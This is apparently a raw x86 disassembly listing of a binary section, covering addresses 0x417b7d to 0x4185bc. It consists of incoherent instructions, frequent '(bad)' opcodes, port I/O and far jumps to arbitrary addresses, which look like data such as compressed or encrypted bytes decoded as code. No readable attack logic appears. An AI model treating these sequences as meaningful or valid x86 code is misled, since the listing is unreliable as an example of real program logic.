  417b7d:	je     0x417b5f
  417b7f:	fidivr DWORD PTR [edi]
  417b81:	jmp    0x664ae257
  417b86:	(bad)  
  417b87:	(bad)  
  417b88:	cmp    esp,DWORD PTR [esp+edi*4+0x4d]
  417b8c:	xchg   ebp,eax
  417b8d:	dec    esi
  417b8e:	fbld   TBYTE PTR [esi]
  417b90:	adc    ch,BYTE PTR fs:[esi+0x4035bbbb]
  417b97:	xor    esp,DWORD PTR [ebx-0x5ddfe96f]
  417b9d:	mov    bl,0x1f
  417b9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ba0:	stos   DWORD PTR es:[edi],eax
  417ba1:	xchg   esp,eax
  417ba2:	je     0x417b55
  417ba4:	inc    esp
  417ba5:	or     eax,0x353ae3c9
  417baa:	popf   
  417bab:	(bad)  
  417bac:	cmp    al,0xf6
  417bae:	sqrtps xmm7,XMMWORD PTR [ecx-0x2d32fd5e]
  417bb5:	fimul  DWORD PTR [eax-0xefeece0]
  417bbb:	adc    eax,0xf76febf
  417bc0:	add    bh,0x99
  417bc3:	fsub   DWORD PTR [eax]
  417bc5:	ret    0x106d
  417bc8:	cmp    ah,BYTE PTR [ecx+ecx*2]
  417bcb:	and    dh,BYTE PTR [edx]
  417bcd:	mov    esp,0xf633c320
  417bd2:	pusha  
  417bd3:	jne    0x417ba9
  417bd5:	addr16 mov ds:0x56ca,eax
  417bd9:	arpl   WORD PTR [eax+0x3f77ed22],bp
  417bdf:	sub    al,0xc5
  417be1:	or     DWORD PTR [esi-0x22b4a0cf],esi
  417be7:	mov    al,BYTE PTR cs:[ecx+eiz*8+0xc26bf4b]
  417bef:	lock add dh,BYTE PTR [ebx+ecx*1+0x61]
  417bf4:	xor    eax,0x8979ffe4
  417bf9:	out    0x88,al
  417bfb:	adc    BYTE PTR [ebp+0x3e],dh
  417bfe:	loopne 0x417be9
  417c00:	retf   
  417c01:	not    DWORD PTR [ecx+0x114cc18c]
  417c07:	push   0x12671d18
  417c0c:	call   0x0:0x8ee21d
	...
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0xb5
  417c81:	loop   0x417ca6
  417c83:	push   0xffffff80
  417c85:	sti    
  417c86:	add    BYTE PTR [eax],al
  417c88:	add    al,0x1
  417c8a:	add    BYTE PTR [eax],al
  417c8c:	inc    edi
  417c8d:	enter  0x8378,0x54
  417c91:	xlat   BYTE PTR ds:[ebx]
  417c92:	mov    al,ds:0x8d1a82ab
  417c97:	cmp    edx,DWORD PTR ds:0x4e6016b2
  417c9d:	jle    0x417c7e
  417c9f:	mov    ds:0x446dc3bf,al
  417ca4:	push   ebp
  417ca5:	addr16 xchg esp,eax
  417ca7:	sbb    al,0x5f
  417ca9:	in     al,0x57
  417cab:	(bad)  
  417cac:	jmp    0xad4a:0x1f9bf13d
  417cb3:	les    edx,FWORD PTR [esi]
  417cb5:	loop   0x417d31
  417cb7:	or     eax,0xaad914da
  417cbc:	mov    DWORD PTR [ebx+eiz*8],esp
  417cbf:	push   ss
  417cc0:	xor    DWORD PTR [ebp-0xc],ecx
  417cc3:	sbb    bl,BYTE PTR [esi+0x22]
  417cc6:	sbb    eax,0xf546cdee
  417ccb:	and    dh,BYTE PTR [esi]
  417ccd:	retf   0xe93
  417cd0:	retf   
  417cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cd2:	xchg   edx,eax
  417cd3:	std    
  417cd4:	gs stos DWORD PTR es:[edi],eax
  417cd6:	retf   0x935a
  417cd9:	cs ret 0xd97a
  417cdd:	scas   eax,DWORD PTR es:[edi]
  417cde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cdf:	mov    eax,ds:0x773e427e
  417ce4:	sub    DWORD PTR [eax+0x45],esp
  417ce7:	sub    BYTE PTR [esi-0x27],bh
  417cea:	stc    
  417ceb:	popf   
  417cec:	mov    ?,edi
  417cee:	test   BYTE PTR [edi+edx*8],dl
  417cf1:	(bad)  
  417cf2:	es xchg esp,eax
  417cf4:	mov    dl,0xa2
  417cf6:	pushf  
  417cf7:	inc    ebp
  417cf8:	push   ds
  417cf9:	cmp    ebx,ebx
  417cfb:	mov    dh,0xfc
  417cfd:	call   0x2bd6:0xe4d4a9de
  417d04:	push   ds
  417d05:	enter  0xe6c0,0x3c
  417d09:	call   0x1fa8:0x41ed33f4
  417d10:	fisub  WORD PTR [ebp+0x167a2ec6]
  417d16:	mov    edi,0x8fe3d03c
  417d1b:	cs pop ebp
  417d1d:	dec    ecx
  417d1e:	xor    al,0x9b
  417d20:	jbe    0x417d6f
  417d22:	out    dx,eax
  417d23:	(bad)  
  417d25:	fbstp  TBYTE PTR [ebx]
  417d27:	scas   eax,DWORD PTR es:[edi]
  417d28:	test   BYTE PTR [ebx+0x3e0e5445],ah
  417d2e:	mov    esi,0xdb85244a
  417d33:	dec    esp
  417d34:	mov    ds:0x5e372171,al
  417d39:	mov    ebp,0x8f404012
  417d3e:	stos   BYTE PTR es:[edi],al
  417d3f:	or     ebx,ebx
  417d41:	scas   eax,DWORD PTR es:[edi]
  417d42:	add    BYTE PTR ds:0x552ee620,dl
  417d48:	cli    
  417d49:	mov    WORD PTR ds:0xc6df699a,?
  417d4f:	(bad)  
  417d51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d52:	ds out dx,eax
  417d54:	scas   al,BYTE PTR es:[edi]
  417d55:	adc    esp,esp
  417d57:	rcl    BYTE PTR [edi+0x1d],1
  417d5a:	push   ds
  417d5b:	jae    0x417d6d
  417d5d:	jmp    0x5310ff64
  417d62:	(bad)  
  417d64:	inc    edi
  417d65:	jno    0x417dc5
  417d67:	push   edi
  417d68:	jnp    0x417da7
  417d6a:	and    BYTE PTR [eax-0x72],bl
  417d6d:	mov    ebx,ecx
  417d6f:	dec    edi
  417d70:	push   ss
  417d71:	imul   al
  417d73:	and    eax,DWORD PTR [edi-0x4a]
  417d76:	ret    0x634d
  417d79:	xchg   DWORD PTR [edx],esi
  417d7b:	and    ebp,DWORD PTR [ecx]
  417d7d:	rcr    BYTE PTR [edi-0x7d],0x66
  417d81:	push   cs
  417d82:	ror    BYTE PTR [esp+eax*4+0x27],cl
  417d86:	or     edi,ebp
  417d88:	loope  0x417dad
  417d8a:	add    al,0xfb
  417d8c:	dec    ebx
  417d8d:	push   ss
  417d8e:	(bad)  
  417d8f:	mov    WORD PTR [eax],es
	...
  417df1:	add    BYTE PTR [eax],al
  417df3:	add    BYTE PTR [edi],dl
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	mov    ecx,0x848710e8
  417e05:	cld    
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    al,0x1
  417e0a:	add    BYTE PTR [eax],al
  417e0c:	mov    ebx,0x8b66448
  417e11:	mov    edi,0x1ce301a0
  417e16:	xchg   ebx,eax
  417e17:	stos   BYTE PTR es:[edi],al
  417e18:	and    dh,cl
  417e1a:	dec    esp
  417e1b:	ja     0x417e3e
  417e1d:	nop
  417e1e:	fild   WORD PTR [ebp+0x70]
  417e21:	call   0x9f0205e4
  417e26:	mov    ebx,ecx
  417e28:	retf   0x1099
  417e2b:	pop    esi
  417e2c:	xchg   DWORD PTR [ecx-0x66],esp
  417e2f:	pop    ecx
  417e30:	sahf   
  417e31:	cmc    
  417e32:	and    cl,BYTE PTR [esi-0x78f1a6a0]
  417e38:	pop    ds
  417e39:	mov    dh,0x97
  417e3b:	dec    esi
  417e3c:	ror    BYTE PTR [ebp+ebp*8-0x68274a99],1
  417e43:	shl    BYTE PTR [esi+0x2c],1
  417e46:	dec    edx
  417e47:	mov    ch,0x5f
  417e49:	pushf  
  417e4a:	in     al,0xdc
  417e4c:	jle    0x417e50
  417e4e:	das    
  417e4f:	push   ebp
  417e50:	xor    al,ah
  417e52:	jg     0x417e1c
  417e54:	push   ecx
  417e55:	popf   
  417e56:	mov    ds:0xdbc74d9e,eax
  417e5b:	push   cs
  417e5c:	xchg   esi,eax
  417e5d:	mov    dl,0xdd
  417e5f:	ds push esp
  417e61:	lea    esp,[edx-0x18]
  417e64:	mov    ch,0xee
  417e66:	sbb    BYTE PTR [edx+esi*4],al
  417e69:	loopne 0x417e4f
  417e6b:	xlat   BYTE PTR ds:[ebx]
  417e6c:	aam    0xd3
  417e6e:	push   ebx
  417e6f:	repnz loop 0x417e39
  417e72:	icebp  
  417e73:	outs   dx,DWORD PTR ds:[esi]
  417e74:	sti    
  417e75:	xor    BYTE PTR [esi+edi*8+0x12fc8f9],ah
  417e7c:	adc    al,0x18
  417e7e:	add    ebx,esi
  417e80:	mov    esp,0x1155dc4c
  417e85:	mov    al,0x50
  417e87:	mov    ds:0x95f9b199,al
  417e8c:	imul   edi,DWORD PTR [ebx-0x10],0xffffffed
  417e90:	jno    0x417f0a
  417e92:	(bad)  
  417e95:	in     al,0x5e
  417e97:	out    0x8a,eax
  417e99:	stos   DWORD PTR es:[edi],eax
  417e9a:	fcomp  DWORD PTR [ecx]
  417e9c:	mov    BYTE PTR [edx+esi*1-0x66a2add6],dh
  417ea3:	mov    cl,0x52
  417ea5:	mov    dl,0x4a
  417ea7:	loope  0x417e4f
  417ea9:	out    0x58,eax
  417eab:	sahf   
  417eac:	xchg   DWORD PTR [ebx-0x15],edx
  417eaf:	iret   
  417eb0:	lea    ebp,[edi-0x7dd13721]
  417eb6:	stc    
  417eb7:	es stos BYTE PTR es:[edi],al
  417eb9:	dec    ebp
  417eba:	loopne 0x417ec0
  417ebc:	or     BYTE PTR [ebx],ch
  417ebe:	je     0x417e5b
  417ec0:	fucomip st,st(1)
  417ec2:	jo     0x417ee1
  417ec4:	mov    al,ds:0xe42be179
  417ec9:	lahf   
  417eca:	jns    0x417f0f
  417ecc:	out    0x97,eax
  417ece:	sbb    eax,0xa2aaa5d3
  417ed3:	push   ss
  417ed4:	not    DWORD PTR [esp+ebp*2+0x38]
  417ed8:	push   ebx
  417ed9:	outs   dx,BYTE PTR ds:[esi]
  417eda:	adc    al,0xa0
  417edc:	aam    0xc3
  417ede:	sbb    BYTE PTR [esi+0x3c9f9e21],dh
  417ee4:	mov    ah,0x22
  417ee6:	pusha  
  417ee7:	shl    BYTE PTR [ebx-0x68e3a563],0xc
  417eee:	push   ebp
  417eef:	mov    ch,0x40
  417ef1:	mov    ch,0xe5
  417ef3:	xor    eax,0x75965f44
  417ef8:	adc    ebx,ecx
  417efa:	jmp    0x2b77cc98
  417eff:	push   ebx
  417f00:	push   edx
  417f01:	cmp    ebx,edi
  417f03:	xlat   BYTE PTR ds:[ebx]
  417f04:	(bad)  
  417f05:	jge    0x417f65
  417f07:	add    eax,0xe6df802b
  417f0c:	(bad)  
  417f0d:	jge    0x417f42
  417f0f:	out    0x0,eax
	...
  417f71:	add    BYTE PTR [eax],al
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	inc    edi
  417f81:	push   ebp
  417f82:	test   eax,0xfd8874
  417f87:	add    BYTE PTR [ecx+eax*1],al
  417f8a:	add    BYTE PTR [eax],al
  417f8c:	icebp  
  417f8d:	mul    DWORD PTR [edx-0x77182d]
  417f93:	sti    
  417f94:	out    0x4f,al
  417f96:	pushw  es
  417f98:	in     al,dx
  417f99:	or     edx,0x76f010b1
  417f9f:	inc    eax
  417fa0:	jo     0x417fff
  417fa2:	int3   
  417fa3:	cmp    dl,BYTE PTR [edx]
  417fa5:	popf   
  417fa6:	mov    fs,ebp
  417fa8:	fmul   DWORD PTR ds:0x4d4ad6db
  417fae:	push   eax
  417faf:	jle    0x417f3d
  417fb1:	sub    DWORD PTR [ecx-0x74],esi
  417fb4:	xor    ecx,eax
  417fb6:	push   0x5edea0e4
  417fbb:	aad    0xfb
  417fbd:	cmp    ax,0xe72e
  417fc1:	push   ebp
  417fc2:	add    ebp,DWORD PTR [ebx+0x5f2d4297]
  417fc8:	retf   
  417fc9:	js     0x417f8d
  417fcb:	pop    esp
  417fcc:	mov    ds:0xe410ca82,eax
  417fd1:	and    edx,DWORD PTR [edx+0x6a]
  417fd4:	icebp  
  417fd5:	in     eax,0x54
  417fd7:	cs push edx
  417fd9:	addr16 call 0x11b6:0x59abecfb
  417fe1:	js     0x418007
  417fe3:	sub    BYTE PTR [edx],ah
  417fe5:	call   FWORD PTR [ebx+0x17e46aa0]
  417feb:	dec    esi
  417fec:	push   0xfca5926c
  417ff1:	mov    eax,ebp
  417ff3:	jl     0x41800c
  417ff5:	cmp    al,0x6e
  417ff7:	test   BYTE PTR [ebx+ebx*2-0x45],al
  417ffb:	and    eax,DWORD PTR [edx-0x71]
  417ffe:	stc    
  417fff:	fadd   st,st(3)
  418001:	pop    edi
  418002:	cmp    al,0x72
  418004:	ror    BYTE PTR [ebx],cl
  418006:	pop    es
  418007:	sbb    eax,0x59c789ef
  41800c:	repz cli 
  41800e:	sahf   
  41800f:	fmul   DWORD PTR [ecx+edi*2+0x2f]
  418013:	mov    ecx,0x7fa94127
  418018:	mov    BYTE PTR [edi],ah
  41801a:	add    eax,esp
  41801c:	sub    eax,0x1046a4aa
  418021:	clc    
  418022:	fnstcw WORD PTR [esi-0x40]
  418025:	cdq    
  418026:	fistp  DWORD PTR [edi+0x55]
  418029:	das    
  41802a:	or     DWORD PTR ds:0x1d547451,esi
  418030:	mov    ah,0x79
  418032:	xor    eax,0xbd446046
  418037:	xor    eax,0xde09b0b4
  41803c:	popa   
  41803d:	pop    es
  41803e:	call   0xd09828d6
  418043:	jns    0x41803c
  418045:	xor    BYTE PTR [ebx],bl
  418047:	add    dh,ch
  418049:	clc    
  41804a:	add    eax,0xa029419c
  41804f:	sbb    ah,0x57
  418052:	fcomp  QWORD PTR [ebp-0x7eccae28]
  418058:	adc    BYTE PTR [ecx],ch
  41805a:	rcl    DWORD PTR [ebx+0x67],1
  41805d:	int3   
  41805e:	inc    ecx
  41805f:	adc    eax,0x6d7d93bc
  418064:	push   esp
  418065:	outs   dx,DWORD PTR ds:[esi]
  418066:	cmp    BYTE PTR [edx+0x72],bh
  418069:	jne    0x4180cf
  41806b:	jp     0x418020
  41806d:	adc    esi,esi
  41806f:	int3   
  418070:	loopne 0x417ffa
  418072:	ins    BYTE PTR es:[edi],dx
  418073:	hlt    
  418074:	mov    dl,0x1b
  418076:	lds    esp,FWORD PTR [edi+ecx*1+0x4f]
  41807a:	mov    ?,eax
  41807c:	jl     0x418055
  41807e:	mov    ecx,0x1a58b279
  418083:	pop    ebx
  418084:	iret   
  418085:	mov    ah,0xbf
  418087:	xor    ch,al
  418089:	mov    ah,0x7
  41808b:	sub    esi,DWORD PTR [ebx+eax*4-0x2b]
  41808f:	data16 add BYTE PTR [eax],al
	...
  4180f2:	add    BYTE PTR [eax],al
  4180f4:	test   eax,0xff456b7e
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x3b2fdebc,eax
  418101:	ja     0x41812e
  418103:	adc    DWORD PTR [esi+edi*8+0x1040000],ecx
  41810a:	add    BYTE PTR [eax],al
  41810c:	(bad)  
  41810d:	in     al,dx
  41810e:	aam    0xfa
  418110:	lods   al,BYTE PTR ds:[esi]
  418111:	push   0xe458c71a
  418116:	dec    edx
  418117:	arpl   WORD PTR [edi],bp
  418119:	sbb    DWORD PTR [edi+0x4b],eax
  41811c:	xor    BYTE PTR [edx],bl
  41811e:	xchg   edi,eax
  41811f:	cwde   
  418120:	shl    DWORD PTR ds:0xfdbd1652,0xc3
  418127:	pop    ebx
  418128:	outs   dx,BYTE PTR ds:[esi]
  418129:	ficomp WORD PTR [edx]
  41812b:	std    
  41812c:	int3   
  41812d:	xchg   ecx,eax
  41812e:	cmp    bl,dh
  418130:	xchg   esi,eax
  418131:	pop    edi
  418132:	jmp    0x37d:0xe3e2d187
  418139:	sbb    eax,0xb0e05abe
  41813e:	jp     0x418174
  418140:	fld    DWORD PTR [eax+0x72]
  418143:	fsub   DWORD PTR [edx+0x4b]
  418146:	icebp  
  418147:	push   cs
  418148:	ins    DWORD PTR es:[edi],dx
  418149:	pop    edx
  41814a:	cwde   
  41814b:	lods   al,BYTE PTR ds:[esi]
  41814c:	pop    esi
  41814d:	cmp    dl,ah
  41814f:	and    dl,BYTE PTR [edx+0x21]
  418152:	add    al,0x8e
  418154:	pop    eax
  418155:	test   eax,0x4a3263fa
  41815a:	mov    edx,0x8cf47de0
  41815f:	dec    ecx
  418160:	jne    0x4181c8
  418162:	clc    
  418163:	dec    ebp
  418164:	enter  0xb1f2,0x4c
  418168:	dec    edx
  418169:	mov    cl,0x7f
  41816b:	shr    cl,cl
  41816d:	data16 adc bh,dl
  418170:	adc    al,0x7f
  418172:	mov    eax,0xd4daed47
  418177:	push   ebx
  418178:	in     eax,dx
  418179:	(bad)  
  41817a:	mov    edx,0xaf0162c4
  41817f:	ins    BYTE PTR es:[edi],dx
  418180:	xor    ah,BYTE PTR [esi+0x60bad1d6]
  418186:	sub    BYTE PTR [edi],cl
  418188:	push   0x25
  41818a:	pop    edx
  41818b:	in     eax,dx
  41818c:	inc    ebp
  41818d:	push   edx
  41818e:	cs jp  0x4181a3
  418191:	cmp    bl,BYTE PTR [esi]
  418193:	inc    ecx
  418194:	(bad)  
  418196:	and    dl,BYTE PTR ds:0x9ce9defc
  41819c:	aaa    
  41819d:	into   
  41819e:	(bad)  
  41819f:	xor    ebp,DWORD PTR [eax+0x8]
  4181a2:	jb     0x418157
  4181a4:	int3   
  4181a5:	jb     0x4181fc
  4181a7:	mov    ecx,0xc48d16f2
  4181ac:	sub    al,0x5
  4181ae:	inc    ebx
  4181af:	lahf   
  4181b0:	xchg   DWORD PTR [ebx+ebp*1+0x3b556dcd],ecx
  4181b7:	aad    0x34
  4181b9:	pop    ebx
  4181ba:	push   es
  4181bb:	add    al,0x76
  4181bd:	adc    ebp,DWORD PTR [ebp+0x51]
  4181c0:	mov    ebx,0x49ac6383
  4181c5:	dec    ecx
  4181c6:	xchg   ebp,eax
  4181c7:	and    ecx,edx
  4181c9:	inc    ebx
  4181ca:	push   ss
  4181cb:	push   esi
  4181cc:	std    
  4181cd:	out    0x27,al
  4181cf:	lahf   
  4181d0:	mov    DWORD PTR [edx-0x51],eax
  4181d3:	retf   
  4181d4:	es aam 0x87
  4181d7:	mov    ecx,0x8081f7f
  4181dc:	in     al,0xec
  4181de:	cdq    
  4181df:	ret    
  4181e0:	mov    DWORD PTR [ebx-0x7a],0xf1fedbb5
  4181e7:	jge    0x418256
  4181e9:	imul   esp,DWORD PTR [edi-0x31],0xcf1f7790
  4181f0:	arpl   WORD PTR [eax],cx
  4181f2:	sub    BYTE PTR [ecx-0x26],al
  4181f5:	lods   al,BYTE PTR ds:[esi]
  4181f6:	bound  ecx,QWORD PTR [esi]
  4181f8:	inc    esi
  4181f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181fa:	das    
  4181fb:	xor    ebx,DWORD PTR [ebp+eiz*1+0x5a]
  4181ff:	out    dx,eax
  418200:	mov    esp,0x96ef97bb
  418205:	(bad)  
  418206:	and    al,0x2b
  418208:	xchg   edx,eax
  418209:	out    0x90,al
  41820b:	fdiv   st(1),st
  41820d:	jmp    0x4181b6
  41820f:	jae    0x418211
	...
  418271:	add    BYTE PTR [eax],al
  418273:	add    BYTE PTR [edi],dh
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0xb8e5b8d6
  418282:	mov    eax,ds:0xff90df
  418287:	add    BYTE PTR [ecx+eax*1],al
  41828a:	add    BYTE PTR [eax],al
  41828c:	aad    0xbd
  41828e:	in     al,0x29
  418290:	inc    edi
  418291:	xlat   BYTE PTR ds:[ebx]
  418292:	arpl   WORD PTR [edi-0x55],dx
  418295:	inc    ebp
  418296:	add    dh,al
  418298:	leave  
  418299:	cs test eax,0x8e38f101
  41829f:	pop    ss
  4182a0:	out    dx,al
  4182a1:	(bad)  
  4182a2:	jg     0x41826b
  4182a4:	pop    eax
  4182a5:	gs loop 0x41828b
  4182a8:	rcl    ebp,cl
  4182aa:	sub    BYTE PTR [esi+0x4421aba8],0xe0
  4182b1:	ror    DWORD PTR [eax+0x17],1
  4182b4:	(bad)  
  4182b6:	mov    ?,ebx
  4182b8:	(bad)  
  4182b9:	(bad)  
  4182bb:	int3   
  4182bc:	les    edx,FWORD PTR [ebp+0xca85db1]
  4182c2:	push   ebx
  4182c3:	adc    edx,eax
  4182c5:	(bad)  
  4182c6:	call   0xafd38b96
  4182cb:	dec    eax
  4182cc:	push   edx
  4182cd:	jp     0x41828d
  4182cf:	cdq    
  4182d0:	sar    BYTE PTR [edx],cl
  4182d2:	pop    esi
  4182d3:	mov    ds:0xd3a0ee88,al
  4182d8:	ror    al,0x42
  4182db:	xor    DWORD PTR ds:0x9b74154a,esp
  4182e1:	inc    esp
  4182e2:	lods   eax,DWORD PTR ds:[esi]
  4182e3:	pop    ecx
  4182e4:	arpl   bp,sp
  4182e6:	pop    ecx
  4182e7:	cmp    BYTE PTR [ebx],ah
  4182e9:	sbb    eax,0x8accadd5
  4182ee:	ja     0x4182ee
  4182f0:	or     cl,bh
  4182f2:	pop    esi
  4182f3:	into   
  4182f4:	(bad)  
  4182f5:	ja     0x41830e
  4182f7:	das    
  4182f8:	das    
  4182f9:	mov    edx,0xdd18eb2a
  4182fe:	jne    0x418348
  418300:	ins    BYTE PTR es:[edi],dx
  418301:	test   ah,al
  418303:	addr16 sbb ch,bh
  418306:	arpl   WORD PTR [ebx],cx
  418308:	cdq    
  418309:	sbb    edx,DWORD PTR gs:[esi]
  41830c:	imul   ebp,esi,0x8feb6ec6
  418312:	lods   al,BYTE PTR ds:[esi]
  418313:	sbb    eax,DWORD PTR [ecx]
  418315:	push   edx
  418316:	pushf  
  418317:	aaa    
  418318:	std    
  418319:	xor    esp,DWORD PTR [eax-0x4e]
  41831c:	adc    BYTE PTR [edx],cl
  41831e:	sub    eax,0xaac90ad9
  418323:	mov    al,BYTE PTR [ebp+esi*8+0x69b05163]
  41832a:	or     ebp,DWORD PTR [esi*8+0x1175ce43]
  418331:	inc    eax
  418332:	sar    BYTE PTR [ebx],0xc9
  418335:	fwait
  418336:	sub    al,0xc8
  418338:	dec    dx
  41833a:	in     eax,dx
  41833b:	gs sti 
  41833d:	adc    BYTE PTR [ecx+ecx*2+0x55],0xab
  418342:	xlat   BYTE PTR ds:[ebx]
  418343:	xor    eax,0x74cac79b
  418348:	test   al,0xdf
  41834a:	cli    
  41834b:	sbb    DWORD PTR ds:0xf2fe4d77,0xffffff8c
  418352:	mov    edx,0xc866061a
  418357:	push   esi
  418358:	mov    esp,0x45d46a06
  41835d:	stc    
  41835e:	(bad)  
  41835f:	pop    ds
  418360:	and    al,0x28
  418362:	jp     0x41836b
  418364:	popf   
  418365:	test   al,0x83
  418367:	sar    DWORD PTR [ecx],1
  418369:	xchg   esp,eax
  41836a:	retf   
  41836b:	sub    al,0x61
  41836d:	test   BYTE PTR [ebx+0x5312ceb9],dh
  418373:	cli    
  418374:	dec    esi
  418375:	mov    dl,BYTE PTR [esi-0x77]
  418378:	(bad)  
  418379:	cmp    al,0x67
  41837b:	xor    dh,BYTE PTR [edx]
  41837d:	(bad)  
  41837e:	xchg   ebp,eax
  41837f:	test   BYTE PTR [edi],al
  418381:	mov    dh,0xd8
  418383:	mov    eax,0x4f28aa38
  418388:	mov    WORD PTR [edi+0x5d],cs
  41838b:	xlat   BYTE PTR ds:[ebx]
  41838c:	pmullw mm5,QWORD PTR [edx]
  41838f:	(bad)  
	...
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	dec    ecx
  418401:	dec    eax
  418402:	adc    eax,0x10094dc
  418407:	add    BYTE PTR [ecx+eax*1],al
  41840a:	add    BYTE PTR [eax],al
  41840c:	mov    esi,0x3637ee61
  418411:	loopne 0x418475
  418413:	mov    ah,0x4
  418415:	cdq    
  418416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418417:	adc    ebp,DWORD PTR [esi-0xe]
  41841a:	cdq    
  41841b:	sbb    al,0x30
  41841d:	sub    eax,0xcb49bf1e
  418422:	mov    cl,BYTE PTR [edi+0x3c]
  418425:	scas   eax,DWORD PTR es:[edi]
  418426:	xchg   ebp,eax
  418427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418428:	mov    ds,WORD PTR [edx-0x11f13554]
  41842e:	cmp    bl,BYTE PTR [edx-0x42]
  418431:	(bad)  
  418433:	mov    eax,0xc7dac3c
  418438:	adc    cl,al
  41843a:	stos   DWORD PTR es:[edi],eax
  41843b:	sub    DWORD PTR [ebp+0x499af386],0x57
  418442:	aam    0x59
  418444:	inc    edi
  418445:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418446:	(bad)  
  418447:	(bad)  
  418448:	es mov cl,0x46
  41844b:	sbb    BYTE PTR [ebx],0x4e
  41844e:	and    ecx,0xbda72cd4
  418454:	xchg   edx,eax
  418455:	xor    ecx,ecx
  418457:	and    BYTE PTR [ebx+edx*4],cl
  41845a:	dec    edx
  41845b:	cmp    DWORD PTR [edx-0x3e],ebx
  41845e:	xchg   ebp,eax
  41845f:	mov    edi,0x9a591f6e
  418464:	jg     0x418487
  418466:	scas   al,BYTE PTR es:[edi]
  418467:	arpl   WORD PTR [esi],si
  418469:	sbb    dh,BYTE PTR [edi]
  41846b:	cmp    eax,0x357f86e8
  418470:	pop    ebx
  418471:	push   ss
  418472:	es scas al,BYTE PTR es:[edi]
  418474:	cmp    DWORD PTR [ebx-0x695ce6d2],0xc4ffdb13
  41847e:	xor    DWORD PTR [ecx],ebx
  418480:	add    al,0xb3
  418482:	ret    0xbc57
  418485:	and    edx,DWORD PTR [eax+0x11]
  418488:	(bad)  
  418489:	aas    
  41848a:	dec    esp
  41848b:	call   0x6947b0ca
  418490:	cwde   
  418491:	push   esi
  418492:	rcr    dl,cl
  418494:	stos   BYTE PTR es:[edi],al
  418495:	push   ecx
  418496:	dec    esp
  418497:	add    eax,DWORD PTR [edi+0x5a7477f2]
  41849d:	inc    edi
  41849e:	cmp    ah,ah
  4184a0:	sbb    al,0xe1
  4184a2:	les    eax,FWORD PTR [ebp-0x401f5a90]
  4184a8:	lods   al,BYTE PTR ds:[esi]
  4184a9:	mov    ebp,0xedc1428e
  4184ae:	mov    esi,0xeacd1e42
  4184b3:	xchg   ebx,eax
  4184b4:	daa    
  4184b5:	std    
  4184b6:	mov    es,WORD PTR [ebx]
  4184b8:	jmp    FWORD PTR [eax]
  4184ba:	(bad)
  4184bd:	cmp    ebp,DWORD PTR [ebx+0x6c81f428]
  4184c3:	sbb    edi,DWORD PTR [ebx+0xc]
  4184c6:	in     al,dx
  4184c7:	retf   
  4184c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184c9:	retf   
  4184ca:	and    esp,ebp
  4184cc:	(bad)  
  4184cd:	or     edi,DWORD PTR [edi-0x8]
  4184d0:	jae    0x418495
  4184d2:	inc    esi
  4184d3:	jae    0x41854e
  4184d5:	test   al,0x1d
  4184d7:	stos   BYTE PTR es:[edi],al
  4184d8:	int    0xcc
  4184da:	xor    ah,cl
  4184dc:	in     al,dx
  4184dd:	jne    0x4184f8
  4184df:	jp     0x418550
  4184e1:	cmp    DWORD PTR [edx+0x3f17d7b7],ecx
  4184e7:	xchg   edi,eax
  4184e8:	fst    QWORD PTR [eax+0x58]
  4184eb:	fsubr  QWORD PTR [ecx]
  4184ed:	ins    BYTE PTR es:[edi],dx
  4184ee:	dec    ebx
  4184ef:	mov    ch,0x4f
  4184f1:	sar    BYTE PTR [eax+eiz*2-0x7c],0xd
  4184f6:	cmp    BYTE PTR [bp+di+0x77],bl
  4184fa:	les    esp,FWORD PTR [ecx-0x773de582]
  418500:	dec    edx
  418501:	arpl   WORD PTR [ebx+0x46],si
  418504:	outs   dx,DWORD PTR gs:[si]
  418507:	jp     0x4184dc
  418509:	test   al,0xc0
  41850b:	test   al,0x18
  41850d:	sub    edi,DWORD PTR [ebp+ecx*4+0x0]
	...
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	jp     0x418539
  418582:	lock add bl,BYTE PTR [eax+0x4000101]
  418589:	add    DWORD PTR [eax],eax
  41858b:	add    BYTE PTR [ebp-0x5ed68267],dh
  418591:	push   ds
  418592:	shr    BYTE PTR ds:0xcbce359f,cl
  418598:	push   es
  418599:	mov    DWORD PTR [ecx+0x38],0x8a2af47e
  4185a0:	mov    ?,ebx
  4185a2:	inc    edi
  4185a3:	dec    edi
  4185a4:	das    
  4185a5:	pop    ecx
  4185a6:	add    al,0x2a
  4185a8:	scas   al,BYTE PTR es:[edi]
  4185a9:	dec    esi
  4185aa:	(bad)  
  4185ab:	mov    BYTE PTR [ebp+edi*8+0x7f],ah
  4185af:	sub    eax,ebx
  4185b1:	dec    edi
  4185b2:	sahf   
  4185b3:	cs mov esp,0xd8e67eb0
  4185b9:	jle    0x418542
  4185bb:	popa   
  4185bc:	xchg   esi,eax
